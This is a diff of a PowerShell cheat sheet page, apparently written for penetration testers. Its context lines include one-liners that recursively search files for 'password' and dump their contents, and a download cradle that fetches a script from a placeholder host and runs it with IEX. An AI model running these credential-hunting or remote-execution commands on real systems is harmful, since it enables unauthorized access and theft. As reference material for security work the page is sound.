@@ -406,7 +406,7 @@ Run `Get-Help $function_name -Examples` for usage
 
 ### Aliases
 
-There are many built-in aliases for the most commonly used cmdlets.  The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way.
+There are many built-in aliases for the most commonly used cmdlets.  The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way.  Here are some commonly used examples.  You can use the `Get-Alias` cmdlet to see the full list.
 
 <table>
   <thead>
@@ -522,7 +522,7 @@ $Env:PATH += ":/temp"
 {% endtab %}
 {% endtabs %}
 
-#### Using System.Environment methods <a id="using-systemenvironment-methods"></a>
+#### Add a folder to PATH using `System.Environment` methods <a id="using-systemenvironment-methods"></a>
 
 The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.
 
@@ -560,7 +560,7 @@ Normal
 
 [https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) - look for text in a file and lists its name and contents.  These examples are looking for the word 'password'.
 
-Shorthand \(aliased\) version:
+#### Shorthand \(aliased\) version:
 
 ```text
 ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
@@ -568,13 +568,19 @@ ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
 
 Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`. 
 
-Full version:
+```text
+ls -R | ? { $_ | sls 'password' } | % { $_ ; gc $_ }
+```
+
+The above is expanded for visibility of the individual elements.  The shorthand version is condensed for situations where characters are at a premium.
+
+#### Full version:
 
 ```text
 Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
 ```
 
-Explanation:
+#### Explanation:
 
 ```text
 # Get a listing of all files within this folder and its subfolders.
@@ -597,9 +603,9 @@ ForEach-Object {
 }
 ```
 
-`ls -R|?{$_|Select-String 'password'}|%{$_;gc $_}`
+\`\`
 
-Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names, you may want to note the following significant differences between the "full" versions and the "golfed" version:
+Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names in the shorthand version, you may want to note the following significant differences between the "full" versions and the "golfed" version:
 
 `Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. \(Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.\) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
 
@@ -657,6 +663,10 @@ wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
 ```text
 Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
 ```
+
+### Silence PowerShell error messages
+
+Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribute, which works similarly to using **`2>/dev/null`** in Linux.  However, this only works for that cmdlet, not the entire one-liner if you pipe output or use semi-colons, etc.  This can be shortened to **`-EA Silently`**. 
 
 ### Unsorted...
 
